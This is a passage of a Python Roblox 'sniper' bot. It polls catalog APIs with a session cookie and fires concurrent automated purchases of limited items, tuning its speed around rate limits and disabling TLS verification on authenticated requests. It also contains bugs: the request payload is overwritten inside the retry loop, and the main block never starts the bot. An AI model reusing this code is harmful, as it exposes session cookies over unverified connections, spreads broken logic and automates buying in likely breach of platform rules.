                                       cookies={".ROBLOSECURITY": self.check_cookie}, ssl=False)
        productid_data = json.loads(await productid.text())[0]

        return productid_data['collectibleProductId']

    async def buy_item(self, productid, limitinfo, mainid: int, fromD: str,session) -> None:

        total_error = 0
        self.total_buy_tried1 += 1
        if mainid in self.except_id:
            pass
        else:
            if limitinfo['price'] > 10:
                return

        data = {
            "collectibleItemId": limitinfo['collectibleItemId'],
            "expectedCurrency": 1,
            "expectedPrice": limitinfo['price'],
            "expectedPurchaserId": int(self.userid),
            "expectedPurchaserType": "User",
            "expectedSellerId": int(limitinfo['creatorTargetId']),
            "expectedSellerType": "User",
            "idempotencyKey": "random uuid4 string that will be your key or smthn",
            "collectibleProductId": productid
        }
        self.buy_thread[mainid] += 1
        task_number = self.total_buy_tried2
        self.total_buy_thread += 1
        while 1:
            if total_error >= 3:
                self.total_buy_thread -= 1
                self.buy_thread[mainid] -= 1
                if len(self.buylog) == self.buyloglimit:
                    self.buylog.pop(0)
                self.buylog.append([f"{task_number}", f"{limitinfo['name']}", "Failed", "demasiados error"])
                return

            if self.id_bought[mainid] >= self.limit_id[mainid]:
                self.total_buy_thread -= 1
                self.buy_thread[mainid] -= 1
                if len(self.buylog) == self.buyloglimit:
                    self.buylog.pop(0)
                self.buylog.append([f"{task_number}", f"{limitinfo['name']}", "Failed", "Límite de cantidad por usuario alcanzada"])
                return

            data["idempotencyKey"] = str(uuid.uuid4())

            try:
                try:
                    res = await session.post(f"https://apis.roblox.com/marketplace-sales/v1/item/{limitinfo['collectibleItemId']}/purchase-item",
                                                json=data,
                                                headers={"x-csrf-token": self.xcsrf,
                                                         'Accept-Encoding': 'gzip, deflate'},
                                                cookies={".ROBLOSECURITY": self.cookie}, ssl=False)
                except asyncio.exceptions.TimeoutError:
                    print("nooooo rate limit hermanoo rate limitt..")
                    self.error += 1
                    total_error += 1
                    await asyncio.sleep(0.5)
                    continue

                if res.reason == "Too Many Requests":
                    print("nooooo rate limit hermanoo rate limitt..")
                    self.error += 1
                    await asyncio.sleep(0.5)
                    total_error += 1
                    continue

                res1 = await res.text()
                if res1 == "":
                    print("Error al intentar obtener la información de compra")
                    self.error += 1
                    total_error += 1
                    continue

                try:
                    data = json.loads(res1)
                except json.JSONDecodeError:
                    self.error += 1
                    total_error += 1
                    print("Error al intentar obtener la información de compra")
                    continue

                if data['errorMessage'] == 'QuantityExhausted':
                    print("ARTÍCULO AGOTADO :(")
                    self.total_buy_thread -= 1
                    self.buy_thread[mainid] -= 1
                    if len(self.buylog) == self.buyloglimit:
                        self.buylog.pop(0)
                    self.buylog.append([f"{task_number}", f"{limitinfo['name']}", "Failed", "ARTÍCULO AGOTADO :("])
                    return
                if not data["purchased"]:
                    self.error += 1
                    total_error += 1
                    print(f"Purchase failed. Response: {res1}. Retrying purchase...")
                    continue
                if data["purchased"]:
                    imgitem = await self.get_imgitem(mainid)
                    if imgitem is None:
                        imgitem = "https://scontent.fntr10-2.fna.fbcdn.net/v/t1.15752-9/361166434_1033898681112637_2350832328705226308_n.png?_nc_cat=105&ccb=1-7&_nc_sid=ae9488&_nc_ohc=yoEP6wNrl0EAX_k4mz-&_nc_oc=AQmZlbdXHoXRLLUOcPHaU-4dYLz9pncPWHIA1c4ovBbiwIUL33EtpxTVwwtKfAJbZkAhExRca4iSJEdkbUxlA3i4&_nc_ht=scontent.fntr10-2.fna&oh=03_AdR2EN6dOF_Jw8GK1FCLxU3w73j8QrjQjRnOuJlvfIaAzA&oe=64D8EE71"
                    print(f"ITEM COMPRADO EXITOSAMENTE. Res:{res1}")
                    self.bought += 1
                    if self.webhook:
                        embed = Embed(
                                title=f"COMPRADO {limitinfo['name']} :)",
                                url=f'https://www.roblox.com/catalog/{mainid}',
                                color=0xb0fcff
                            )
                        embed.add_field(
                                name=f"PRECIO: `{limitinfo['price']}`\nITEM STOCKS: `{limitinfo['totalQuantity']}`\nCOMPRADO EN `{fromD}`",
                                value=f"",
                                inline=True
                            )
                        embed.set_thumbnail(url=imgitem)
                        embed.set_footer(
                                text=f'By isai-Narcisista#5493 | v{Version}',
                                icon_url='https://scontent.fntr10-2.fna.fbcdn.net/v/t1.15752-9/361166434_1033898681112637_2350832328705226308_n.png?_nc_cat=105&ccb=1-7&_nc_sid=ae9488&_nc_ohc=yoEP6wNrl0EAX_k4mz-&_nc_oc=AQmZlbdXHoXRLLUOcPHaU-4dYLz9pncPWHIA1c4ovBbiwIUL33EtpxTVwwtKfAJbZkAhExRca4iSJEdkbUxlA3i4&_nc_ht=scontent.fntr10-2.fna&oh=03_AdR2EN6dOF_Jw8GK1FCLxU3w73j8QrjQjRnOuJlvfIaAzA&oe=64D8EE71'
                            )
                        self.webhook1.send(embed=embed)
                        asyncio.create_task(self.send_logV1(limitinfo, fromD))
                        if len(self.buylog) == self.buyloglimit:
                            self.buylog.pop(0)
                        self.buylog.append([f"{task_number}", f"{limitinfo['name']}", "Success", "ISAI ISAISNIPER "])
                        self.total_buy_thread -= 1
                        return
            except aiohttp.ClientConnectorError as e:
                self.error += 1
                print(f"ERROR EN LA CONEXION: {e}. INTENTANDO COMPRAR...")
                total_error += 1
                continue
            except Exception as e:
                traceback.print_exc()
                self.buy_thread[mainid] -= 1
                self.total_buy_thread -= 1
                if len(self.buylog) == self.buyloglimit:
                    self.buylog.pop(0)
                self.buylog.append([f"{task_number}", f"{limitinfo['name']}", "Failed", f"Unknown error: {e}"])
                return

    async def buy_threads(self, product_id, buydata, ids, fromD: str, session) -> None:
        if self.buy_thread[ids] < 2:
            print("new buy started")
            asyncio.create_task(self.buy_item(product_id, buydata, ids, fromD, session))
            asyncio.create_task(self.buy_item(product_id, buydata, ids, fromD, session))
            asyncio.create_task(self.buy_item(product_id, buydata, ids, fromD, session))
            asyncio.create_task(self.buy_item(product_id, buydata, ids, fromD, session))

    async def buy_threads_autosearch(self, product_id, buydata, ids, fromD: str, session) -> None:
        if self.buy_thread[ids] < 2:
            print("new buy started")
            asyncio.create_task(self.buy_item(product_id, buydata, ids, fromD, session))
            asyncio.create_task(self.buy_item(product_id, buydata, ids, fromD, session))
            asyncio.create_task(self.buy_item(product_id, buydata, ids, fromD, session))
            asyncio.create_task(self.buy_item(product_id, buydata, ids, fromD, session))
            asyncio.create_task(self.buy_item(product_id, buydata, ids, fromD, session))

    async def buy_emitV1(self, buydata, productID):
        if self.connected:
            data = [productID, buydata]
            await sio.emit('new_item_buy', data=data)

    async def _id_check(self, session):
        try:
            async with session.post("https://catalog.roblox.com/v1/catalog/items/details/",
                                        json={"items": [{"itemType": "Asset", "id": int(ids)} for ids in self.items]},
                                        headers={"x-csrf-token": self.check_xcsrf,
                                                     'Accept': "application/json",
                                                      'Accept-Encoding': 'gzip, deflate'},
                                        cookies={".ROBLOSECURITY": self.check_cookie}, ssl=False) as res:
                if res.reason == "Too Many Requests":
                    self.error += 1
                    print("ERROR")
                    return asyncio.sleep(0.5)
                response_text = await res.text()
                if res.reason != "OK":
                    print("failed to get data")
                    self.task_stop = True
                    await self._update_xcsrf()
                    return await asyncio.sleep(1)
                else:
                    self.task_stop = False
                json_response = json.loads(response_text)['data']
                for IDonsale in json_response:
                    # print(f"{IDonsale['name']}: {IDonsale.get('priceStatus')}")
                    if IDonsale.get("priceStatus") != "Off Sale" and IDonsale.get('unitsAvailableForConsumption', 0) > 0:
                        productid_data = await self._get_product_id(IDonsale, session)
                        asyncio.create_task(self.buy_threads(productid_data, IDonsale, IDonsale['id'], "watcherV1", session))
                        asyncio.create_task(self.buy_emitV1(IDonsale, productid_data))
                        self.lastTriedbuy1 = IDonsale['name']


        except aiohttp.ClientConnectorError as e:
            print(f'Connection error: {e}')
            self.error += 1
            return
        except aiohttp.ContentTypeError as e:
            print(f'Content type error: {e}')
            self.error += 1
            return
        except aiohttp.ClientResponseError:
            return
        except (json.JSONDecodeError, KeyError):
            print("ratelimit on checking...")
            self.error += 1
            await asyncio.sleep(1)
            return
        except Exception as e:
            self.error += 1
            print(f"error: {e} in checking func")
            return
        finally:
            return

    async def aibotspeed2(self):
        time1 = 0
        total_error_per_min = 0
        while 1:
            time1 += 1
            if time1 % 60 == 0:
                time1 = 0
                total_error_per_min = self.error - total_error_per_min
                if total_error_per_min > 0:
                    check = total_error_per_min / 60
                    if check >= 0.5:
                        self.wait_time = 1
                    elif check >= 0.35:
                        self.wait_time = 0.75
                    elif check >= 0.25:
                        self.wait_time = 0.5
                else:
                    if self.wait_time - 0.05 >= 0.5:
                        self.wait_time -= 0.1
            await asyncio.sleep(1)

    async def items_snipe(self) -> None:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=None)) as session:
            while 1:
                if len(self.items) > 0:

                    t0 = asyncio.get_event_loop().time()
                    try:
                        await self._id_check(session)
                    except Exception as e:
                        print(f"error: {e} in main thread")
                    self.speed = round(asyncio.get_event_loop().time() - t0, 2)
                    self.check += 1
                if self.speed <= 1:
                    await asyncio.sleep(self.wait_time)

    async def buy_itemV2(self, limitinfo, mainid: int, fromD: str, session) -> None:

        total_error = 0

        self.total_buy_tried2 += 1
        if mainid in self.except_id:
            pass
        else:
            if limitinfo['PriceInRobux'] > 10:
                return

        data = {
            "collectibleItemId": limitinfo['CollectibleItemId'],
            "expectedCurrency": 1,
            "expectedPrice": limitinfo['PriceInRobux'],
            "expectedPurchaserId": int(self.userid),
            "expectedPurchaserType": "User",
            "expectedSellerId": int(limitinfo['Creator']['CreatorTargetId']),
            "expectedSellerType": "User",
            "idempotencyKey": "random uuid4 string that will be your key or smthn",
            "collectibleProductId": limitinfo['CollectibleProductId']
        }
        self.buy_thread[mainid] += 1
        task_number = self.total_buy_tried2
        self.total_buy_thread += 1
        while 1:
            if total_error >= 3:
                self.total_buy_thread -= 1
                self.buy_thread[mainid] -= 1
                if len(self.buylog) == self.buyloglimit:
                    self.buylog.pop(0)
                self.buylog.append([f"{task_number}", f"{limitinfo['Name']}", "Failed", "Too much errors"])
                return


            data["idempotencyKey"] = str(uuid.uuid4())
            try:
                try:
                    res = await session.post(f"https://apis.roblox.com/marketplace-sales/v1/item/{limitinfo['CollectibleItemId']}/purchase-item",
                                                json=data,
                                                headers={"x-csrf-token": self.xcsrf,
                                                         'Accept-Encoding': 'gzip, deflate'},
                                                cookies={".ROBLOSECURITY": self.cookie}, ssl=False)
                except asyncio.exceptions.TimeoutError:
                    print("nooooo el rate limit hermano el rate limitt...")
                    self.error2 += 1
                    total_error += 1
                    await asyncio.sleep(0.5)
                    continue

                if res.reason == "Too Many Requests":
                    print("nooooo el rate limit hermano el rate limitt...")
                    self.error2 += 1
                    await asyncio.sleep(0.5)
                    total_error += 1
                    continue

                res1 = await res.text()
                if res1 == "":
                    print("Error al intentar obtener la información de compra")
                    self.error2 += 1
                    total_error += 1
                    continue

                try:
                    data = json.loads(res1)
                except json.JSONDecodeError:
                    self.error2 += 1
                    total_error += 1
                    print("Error al intentar obtener la información de compra")
                    continue

                if data['errorMessage'] == 'QuantityExhausted':
                    print("Item sold out :(")
                    self.total_buy_thread -= 1
                    self.buy_thread[mainid] -= 1
                    if len(self.buylog) == self.buyloglimit:
                        self.buylog.pop(0)
                    self.buylog.append([f"{task_number}", f"{limitinfo['Name']}", "Failed", "ITEM SOLD OUT rip :("])
                    return
                if not data["purchased"]:
                    self.error2 += 1
                    total_error += 1
                    print(f"COMPRA FALLIDA: {res1}. REINTENTANDO COMPRAR... V2")
                    continue
                if data["purchased"]:
                    imgitem = await self.get_imgitem(mainid)
                    if imgitem is None:
                        imgitem = "https://scontent.fntr10-2.fna.fbcdn.net/v/t1.15752-9/361166434_1033898681112637_2350832328705226308_n.png?_nc_cat=105&ccb=1-7&_nc_sid=ae9488&_nc_ohc=yoEP6wNrl0EAX_k4mz-&_nc_oc=AQmZlbdXHoXRLLUOcPHaU-4dYLz9pncPWHIA1c4ovBbiwIUL33EtpxTVwwtKfAJbZkAhExRca4iSJEdkbUxlA3i4&_nc_ht=scontent.fntr10-2.fna&oh=03_AdR2EN6dOF_Jw8GK1FCLxU3w73j8QrjQjRnOuJlvfIaAzA&oe=64D8EE71"
                    print(f"ITEM COMPRADO EXITOSAMENTE Res:{res1}")
                    self.bought += 1
                    if self.webhook:

                        embed = Embed(
                                title=f"COMPRADO {limitinfo['Name']}:)",
                                url=f'https://www.roblox.com/catalog/{mainid}',
                                color=0xb0fcff
                            )
                        embed.add_field(
                                name=f"PRECIO: `{limitinfo['PriceInRobux']}`\nCOMPRADO EN `{fromD}`",
                                value="",
                                inline=True
                            )
                        embed.set_thumbnail(url=imgitem)
                        embed.set_footer(
                                text=f'By LA MERA VERGA ISAI | v{Version}',
                                icon_url='https://scontent.fntr10-2.fna.fbcdn.net/v/t1.15752-9/361166434_1033898681112637_2350832328705226308_n.png?_nc_cat=105&ccb=1-7&_nc_sid=ae9488&_nc_ohc=yoEP6wNrl0EAX_k4mz-&_nc_oc=AQmZlbdXHoXRLLUOcPHaU-4dYLz9pncPWHIA1c4ovBbiwIUL33EtpxTVwwtKfAJbZkAhExRca4iSJEdkbUxlA3i4&_nc_ht=scontent.fntr10-2.fna&oh=03_AdR2EN6dOF_Jw8GK1FCLxU3w73j8QrjQjRnOuJlvfIaAzA&oe=64D8EE71'
                            )
                        self.webhook1.send(embed=embed)
                        asyncio.create_task(self.send_logV2(limitinfo, fromD))
                        if len(self.buylog) == self.buyloglimit:
                            self.buylog.pop(0)
                        self.buylog.append([f"{task_number}", f"{limitinfo['Name']}", "Éxito", "ISAI "])
                        self.total_buy_thread -= 1
                        return
            except aiohttp.ClientConnectorError as e:
                self.error2 += 1
                print(f"HUBO UN ERROR EN LA CONEXION: {e}. INTENTO COMPRAR...")
                total_error += 1
                continue
            except Exception as e:
                traceback.print_exc()
                self.buy_thread[mainid] -= 1
                self.total_buy_thread -= 1
                if len(self.buylog) == self.buyloglimit:
                    self.buylog.pop(0)
                self.buylog.append([f"{task_number}", f"{limitinfo['Name']}", "Failed", f"Error desconocido:{e}"])
                return

    async def buy_emitV2(self, data):
        if self.connected:
            await sio.emit('new_item_buyV2', data=data)

    async def buy_threadsV2(self, buydata, ids, fromD, session) -> None:
        if self.buy_thread[ids] < 2:
            print("new buy started")
            asyncio.create_task(self.buy_itemV2(buydata, ids, fromD, session))
            asyncio.create_task(self.buy_itemV2(buydata, ids, fromD, session))
            asyncio.create_task(self.buy_itemV2(buydata, ids, fromD, session))
            asyncio.create_task(self.buy_itemV2(buydata, ids, fromD, session))

    async def buy_threads_autosearchV2(self, buydata, ids, fromD, session) -> None:
        if self.buy_thread[ids] < 2:
            print("new buy started")
            asyncio.create_task(self.buy_itemV2(buydata, ids, fromD, session))
            asyncio.create_task(self.buy_itemV2(buydata, ids, fromD, session))
            asyncio.create_task(self.buy_itemV2(buydata, ids, fromD, session))
            asyncio.create_task(self.buy_itemV2(buydata, ids, fromD, session))
            asyncio.create_task(self.buy_itemV2(buydata, ids, fromD, session))

    async def _id_checkv2(self, session, ids):
        try:
            async with session.get(f"https://economy.roblox.com/v2/assets/{ids}/details",
                                        headers=self.headers,
                                        cookies={".ROBLOSECURITY": self.check_cookie}, ssl=False) as res:
                if res.reason == "Too Many Requests":
                    self.error2 += 1
                    print("ERROR V2")
                    return asyncio.sleep(0.5)
                response_text = await res.text()
                IDonSale = json.loads(response_text)
                if IDonSale.get("IsForSale") and IDonSale.get('CollectibleProductId') is not None and IDonSale.get('Remaining') > 0:
                    asyncio.create_task(self.buy_threadsV2(IDonSale, IDonSale['AssetId'], "WatcherV2", session))
                    asyncio.create_task(self.buy_emitV2(IDonSale))
                    self.lastTriedbuy2 = IDonSale['Name']


        except aiohttp.ClientConnectorError as e:
            print(f'Connection error: {e}')
            self.error2 += 1
            return
        except aiohttp.ContentTypeError as e:
            print(f'Content type error: {e}')
            self.error2 += 1
            return
        except aiohttp.ClientResponseError:
            return
        except (json.JSONDecodeError, KeyError):
            print("ratelimit on checking...")
            self.error2 += 1
            await asyncio.sleep(1)
            return
        except Exception as e:
            self.error2 += 1
            print(f"error: {e} in checking func")
            return
        finally:
            return

    async def aibotspeed(self):
        time1 = 0
        total_error_per_min = 0
        while 1:
            time1 += 1
            if time1 % 60 == 0:
                time1 = 0
                total_error_per_min = self.error2 - total_error_per_min
                if total_error_per_min > 0:
                    check = total_error_per_min / 60
                    if check >= 0.5:
                        self.wait_time2 = 1
                    elif check >= 0.35:
                        self.wait_time2 = 0.75
                    elif check >= 0.25:
                        self.wait_time2 = 0.5
                    elif check >= 0.1:
                        self.wait_time2 = 0.25
                    elif check >= 0:
                        self.wait_time2 = 0
                else:
                    if self.wait_time2 - 0.1 >= 0:
                        self.wait_time2 -= 0.1

            await asyncio.sleep(1)



    async def items_snipeV2(self) -> None:
        await asyncio.sleep(0.15)
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=None)) as session:
            while 1:
                if len(self.items) > 0:
                    t0 = asyncio.get_event_loop().time()
                    try:
                        check_task = []
                        for ids in self.items:
                            check_task.append(self._id_checkv2(session, int(ids)))
                        await asyncio.gather(*check_task)
                    except Exception as e:
                        print(f"error: {e} in V2 thread")
                    self.speed2 = round(asyncio.get_event_loop().time() - t0, 2)
                    self.check2 += 1
                    #print(self.wait_time2)
                if self.speed2 <= 1:
                    await asyncio.sleep(self.wait_time2)

    async def start(self):
        self.flag_run = True
        self.thread.append(self.aibotspeed2())
        self.thread.append(self.aibotspeed())
        self.thread.append(self.sever_connect())
        self.thread.append(self.check_connection())
        self.thread.append(self.print_out_stats())
        self.thread.append(self.items_snipe())
        self.thread.append(self.items_snipeV2())
        self.thread.append(self.timeupdater())
        await asyncio.gather(*self.thread, return_exceptions=True)


if __name__ == '__main__':
    while True:
        try:
            sniper = Sniper()
        except:
            continue
